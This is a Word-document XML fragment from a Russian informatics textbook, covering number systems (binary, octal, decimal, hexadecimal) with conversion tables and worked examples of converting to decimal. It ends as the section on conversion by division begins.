        <w:t>Анализировать информационные системы с точки зрения процессов сбора, хранения, обработки и передачи информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понимать проблемы, возникающие на каждом этапе работы с информацией</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Видеть, как информационные процессы реализуются в различных системах (технических, социальных, биологических)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Эта глава завершает первый блок (главы 1.7, 1.5, 1.10) концептуальных основ информатики, где мы изучили </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>что такое информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (глава 1.7), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как её измерить</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (глава 1.5) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какими свойствами она обладает и что с ней делать</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (эта глава).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В следующих главах первого раздела мы перейдём к техническим деталям: системы счисления (1.11), способы представления различных типов данных в компьютере (главы 1.1-1.4, 1.8-1.9) и сжатие информации (1.12). Затем в разделах 2-9 мы изучим технические и программные средства, которые реализуют информационные процессы, и методы работы с информацией в различных областях.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Понимание свойств информации особенно важно будет при изучении:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Баз данных (раздел 7) — где критичны достоверность, полнота, актуальность данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компьютерных сетей (раздел 8) — где важна передача информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Защиты информации (раздел 9) — где нужно обеспечивать достоверность, доступность для легитимных пользователей и недоступность для злоумышленников</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Конец главы_</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.11: Системы счисления. Представление чисел в системах с основанием 2, 8, 16. Перевод из десятичной системы в системы 2, 8, 16, обратный перевод в десятичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Системы счисления — это фундаментальный инструмент для представления чисел, который сопровождает человечество на протяжении тысячелетий. От древних непозиционных систем (римские цифры) до современных позиционных систем — способы записи чисел эволюционировали вместе с развитием математики и технологий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В информатике особое значение имеют позиционные системы счисления с основаниями, являющимися степенями двойки: двоичная (основание 2), восьмеричная (основание 8) и шестнадцатеричная (основание 16). Эти системы естественным образом связаны с архитектурой компьютеров, где информация представляется в виде последовательностей битов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава тесно связана с главой 1.1 (арифметика в двоичной системе), главой 1.9 (представление числовых данных в ЭВМ), а также с разделом 2 (техническая информатика — адресация памяти в шестнадцатеричной системе) и разделом 6 (языки программирования — шестнадцатеричные литералы 0x..., восьмеричные 0o...).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы последовательно рассмотрим понятие системы счисления, изучим позиционные системы с различными основаниями, освоим алгоритмы перевода чисел между системами и поймём практическую значимость этих знаний для работы с компьютерами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Основные понятия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое система счисления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Система счисления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это способ записи (представления) чисел с помощью определённого набора символов (цифр) по установленным правилам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Системы счисления делятся на два основных типа:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Непозиционные системы счисления** — системы, в которых значение цифры не зависит от её положения (позиции) в записи числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Римская система счисления.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>VII = 5 + 1 + 1 = 7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IX = 10 − 1 = 9</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MCMXCIV = 1000 + (1000−100) + (100−10) + (5−1) = 1994</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Позиционные системы счисления** — системы, в которых значение каждой цифры зависит от её позиции (разряда) в записи числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Десятичная система.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>125₁₀ = 1×10² + 2×10¹ + 5×10⁰ = 100 + 20 + 5</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Основание системы счисления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основание системы счисления (base, radix)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это количество различных цифр, используемых для представления чисел в данной позиционной системе счисления.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если основание системы счисления равно *b*, то для записи чисел используются цифры от 0 до (b−1). Каждый разряд числа представляет степень основания.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Развёрнутая форма записи числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Любое число *N* в позиционной системе счисления с основанием *b* можно представить в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>развёрнутой форме</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>N = aₙ×b^n + aₙ₋₁×b^(n−1) + ... + a₁×b¹ + a₀×b⁰ + a₋₁×b^(−1) + a₋₂×b^(−2) + ...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>aᵢ — цифры числа (0 ≤ aᵢ &lt; b)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>b — основание системы счисления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>i — позиция (номер разряда)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: 2024₁₀ = 2×10³ + 0×10² + 2×10¹ + 4×10⁰ = 2000 + 0 + 20 + 4</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Основные системы счисления в информатике</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Двоичная система счисления (Binary)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 2  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алфавит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 0, 1  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t>: Основная система для представления информации в ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Каждая позиция (разряд) двоичного числа соответствует степени двойки:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1011₂ = 1×2³ + 0×2² + 1×2¹ + 1×2⁰ = 8 + 0 + 2 + 1 = 11₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простота физической реализации (два состояния: есть сигнал / нет сигнала)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Надёжность различения состояний</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простота выполнения арифметических операций</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Длинная запись чисел (число разрядов растёт быстро)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Неудобство для восприятия человеком</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Восьмеричная система счисления (Octal)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 8  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алфавит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 0, 1, 2, 3, 4, 5, 6, 7  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t>: Компактная запись двоичных данных, права доступа в UNIX/Linux (chmod)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Каждая позиция восьмеричного числа соответствует степени восьми:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>175₈ = 1×8² + 7×8¹ + 5×8⁰ = 64 + 56 + 5 = 125₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с двоичной системой</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Одна восьмеричная цифра соответствует ровно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>трём двоичным цифрам (триаде)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Восьмеричная | Триада двоичная |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------------|-----------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0            | 000             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1            | 001             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2            | 010             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 3            | 011             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 4            | 100             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 5            | 101             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 6            | 110             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 7            | 111             |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Десятичная система счисления (Decimal)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 10  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алфавит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t>: Основная система для человеческого восприятия и вычислений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Это привычная нам система, которую мы используем ежедневно. Каждая позиция соответствует степени десяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1984₁₀ = 1×10³ + 9×10² + 8×10¹ + 4×10⁰ = 1000 + 900 + 80 + 4</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шестнадцатеричная система счисления (Hexadecimal)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 16  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алфавит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E, F  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t>: Компактная запись двоичных данных, адреса памяти, цвета в веб-дизайне (#FF5733), отладка программ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для представления цифр от 10 до 15 используются латинские буквы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Десятичная | Шестнадцатеричная |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------|-------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 10         | A                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 11         | B                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 12         | C                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 13         | D                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 14         | E                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 15         | F                 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Каждая позиция шестнадцатеричного числа соответствует степени шестнадцати:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1A3₁₆ = 1×16² + 10×16¹ + 3×16⁰ = 256 + 160 + 3 = 419₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с двоичной системой</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Одна шестнадцатеричная цифра соответствует ровно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>четырём двоичным цифрам (тетраде)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Hex | Десятичная | Тетрада двоичная |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----|------------|------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0   | 0          | 0000             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1   | 1          | 0001             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2   | 2          | 0010             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 3   | 3          | 0011             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 4   | 4          | 0100             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 5   | 5          | 0101             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 6   | 6          | 0110             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 7   | 7          | 0111             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 8   | 8          | 1000             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 9   | 9          | 1001             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| A   | 10         | 1010             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| B   | 11         | 1011             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C   | 12         | 1100             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| D   | 13         | 1101             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| E   | 14         | 1110             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| F   | 15         | 1111             |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Перевод чисел из любой системы в десятичную</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для перевода числа из системы с основанием *b* в десятичную систему используется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>метод развёрнутой записи</w:t>
      </w:r>
      <w:r>
        <w:t>: каждую цифру умножаем на соответствующую степень основания и складываем результаты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Алгоритм перевода целых чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Пронумеровать разряды числа справа налево, начиная с 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Каждую цифру умножить на основание системы в степени, равной номеру разряда</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сложить все полученные произведения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры перевода в десятичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 1101₂ в десятичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1101₂ = 1×2³ + 1×2² + 0×2¹ + 1×2⁰</w:t>
        <w:br/>
        <w:t xml:space="preserve">      = 1×8 + 1×4 + 0×2 + 1×1</w:t>
        <w:br/>
        <w:t xml:space="preserve">      = 8 + 4 + 0 + 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">      = 13₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: 1101₂ = 13₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 247₈ в десятичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>247₈ = 2×8² + 4×8¹ + 7×8⁰</w:t>
        <w:br/>
        <w:t xml:space="preserve">     = 2×64 + 4×8 + 7×1</w:t>
        <w:br/>
        <w:t xml:space="preserve">     = 128 + 32 + 7</w:t>
        <w:br/>
        <w:t xml:space="preserve">     = 167₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: 247₈ = 167₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 2AF₁₆ в десятичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Помним: A₁₆ = 10₁₀, F₁₆ = 15₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2AF₁₆ = 2×16² + 10×16¹ + 15×16⁰</w:t>
        <w:br/>
        <w:t xml:space="preserve">      = 2×256 + 10×16 + 15×1</w:t>
        <w:br/>
        <w:t xml:space="preserve">      = 512 + 160 + 15</w:t>
        <w:br/>
        <w:t xml:space="preserve">      = 687₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: 2AF₁₆ = 687₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Перевод дробных чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для дробной части применяется тот же принцип, но степени основания становятся отрицательными.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 4</w:t>
      </w:r>
      <w:r>
        <w:t>: Перевести 101,11₂ в десятичную систему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>101,11₂ = 1×2² + 0×2¹ + 1×2⁰ + 1×2⁻¹ + 1×2⁻²</w:t>
        <w:br/>
        <w:t xml:space="preserve">        = 1×4 + 0×2 + 1×1 + 1×0,5 + 1×0,25</w:t>
        <w:br/>
        <w:t xml:space="preserve">        = 4 + 0 + 1 + 0,5 + 0,25</w:t>
        <w:br/>
        <w:t xml:space="preserve">        = 5,75₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: 101,11₂ = 5,75₁₀ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Перевод чисел из десятичной системы в другие системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Перевод целых чисел методом последовательного деления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для перевода целого десятичного числа в систему с основанием *b* используется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>метод последовательного деления на основание</w:t>
      </w:r>
      <w:r>
